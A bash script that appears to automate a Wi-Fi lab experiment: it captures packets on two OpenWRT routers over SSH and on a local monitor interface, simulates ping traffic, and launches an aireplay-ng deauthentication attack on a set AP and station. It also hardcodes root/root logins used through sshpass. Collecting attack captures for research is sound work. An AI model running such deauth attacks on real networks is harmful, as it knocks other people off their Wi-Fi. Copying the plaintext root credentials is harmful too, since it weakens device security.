#!/bin/bash

# Warnings first
# DO NOT RUN THIS SCRIPT MORE THAN ONCE A SECOND, IT WILL INTERFERE WITH DIRECTORY CREATION
# Since this probably won't be run that often ever, not going to implement better method
# RUN AS ROOT IF YOU WANT LOCAL CAPTURES AND DEAUTH ATTACKS TO NOT FAIL

# Script requires the following nonstandard packages
# Debian Host: TCPdump, Airmon-ng, SSHpass
# OpenWRT Clients: TCPdump, SSH server

# All definitions go here baby

#foreign variables
AP_IP="192.168.123.1"
STA_IP="192.168.124.1"
STA_WIFI_IP="192.168.123.115"
AP_MAC="20:E5:2A:52:D2:E7"
STA_MAC="20:e5:2a:52:d4:34"
#define interface used for each device, as they may be different
AP_int="wlan0"
STA_int="wlan0"
#they werent
#login credentials, same hat as before, but it pays to be flexible
AP_username="root"
AP_password="root"
STA_username="root"
STA_password="root"

#local variables
monitor_int="wlx00c0cab08b68"
attack_int="wlx00c0cab08b68"
#attack_int="wlp3s0"

#capture duration and directory names
capture_duration=60 #seconds
directory=$(date +%Y%m%d_%H%M%S)

# Function to capture packets on foreign devices and transfer them back to host
perform_foreign_capture() {
	local device_ip="$1"
	local username="$2"
	local password="$3"
	local interface="$4"
	local capture_duration="$5"
	local path="./captures/$6"

	# Start tcpdump to capture packes, -W will stop it from splitting capture into multiple files
	# using 'single' quotes here causes command to be interpreted on server so we can use it's
	# HOSTNAME variable instead of ours
	sshpass -p $password ssh $username@$device_ip "tcpdump -W 1 -i $interface -w $device_ip.pcap" & 
	echo "$device_ip started"
    
	#wait until test finished then kill tcpdump, cause stupid tcpdump doesn't provide this
	#functionality by default and also wont process options like -G if it isn't receiving packets
	#like i said, stupid!
	sleep $capture_duration
	sshpass -p $password ssh $username@$device_ip "killall tcpdump"
	echo "$device_ip done"
    
	# Transfer the capture file to the host then delete from router
	sshpass -p $password scp $username@$device_ip:*.pcap $path
	sshpass -p $password ssh $username@$device_ip "rm -f *.pcap" 
}

# Function to capture packets on local device with monitor mode enabled
# This is done because AP and STA cannot collect these packets without their interfaces being in
# Monitor mode, which they can't be set to if they are being used in managed mode for comms
perform_local_capture() {
	local interface="$1"
	local path="./captures/$2"

	#set interface to monitor mode to capture all 802.11 comms
	ip link set $interface down
	iw dev $interface set type monitor
	ip link set $interface up
	
	# Start tcpdump to capture packes, same hat as before
	tcpdump -W 1 -i $interface -w $path/local.pcap & 
	echo "local capture started"
	
	# and stop tcpdump
	sleep $capture_duration
	killall tcpdump
	echo "local capture done"
	
	#set interface back to managed mode just in case
	ip link set $interface down
	iw dev $interface set type managed
	ip link set $interface up
}

#function to perform deauth attack
perform_deauth_attack() {
	local interface="$1"
	local target_AP="$2"
	local target_STA="$3"
	local attack_delay="$4"
	local attack_duration="$5"
	
	#set interface to monitor mode to prepare for attack
	#ip link set $interface down
	#iw dev $interface set type monitor
	#ip link set $interface up
	
	#bit of delay to ensure the capture start doesn't miss the beginning of the attack
	sleep $attack_delay
	
	#perform deauth attack
	#likewise aireplay doesn't have an option for attack for a set period, just for a certain
	#number of packets, so i'm cracking out ol' reliable again
	aireplay-ng -0 0 -a $target_AP -c $target_STA $interface &
	#this version is borked for some reason idk why tho
	#aireplay-ng -deauth 0 -c $target_STA -a $target_AP $interface &
	echo "attack started"
	
	sleep $attack_duration
	killall aireplay-ng
	echo "attack done"
	
	#set interface back to managed mode just in case
	#ip link set $interface down
	#iw dev $interface set type managed
	#ip link set $interface up
}

#function to simulate traffic between hosts
simulate_traffic() {
	local device_ip="$1"
	local username="$2"
	local password="$3"
	local traffic_target="$4"
	local duration="$5"

	#start ping to send packets between devices to simulate network traffic
	sshpass -p $password ssh $username@$device_ip "ping $traffic_target"
	echo "traffic sim started"
	
	sleep $duration
	killall ping
	echo "simulation done"
}

#start of script proper

#root check, needed for tcpdump, changing interface mode etc...
if [ "$(id -u)" -ne 0 ]; then echo "Please run as root." >&2; exit 1; fi

mkdir captures/$directory

# Start captures on both devices simultaneously
perform_foreign_capture $AP_IP $AP_username $AP_password $AP_int $capture_duration $directory &
perform_foreign_capture $STA_IP $STA_username $STA_password $STA_int $capture_duration $directory &

# And on local device
perform_local_capture $monitor_int $directory &

# begin traffic simulation
simulate_traffic $AP_IP $AP_username $AP_password $STA_WIFI_IP $capture_duration & 

# And now perform attack
perform_deauth_attack $attack_int $AP_MAC $STA_MAC 10 20 &
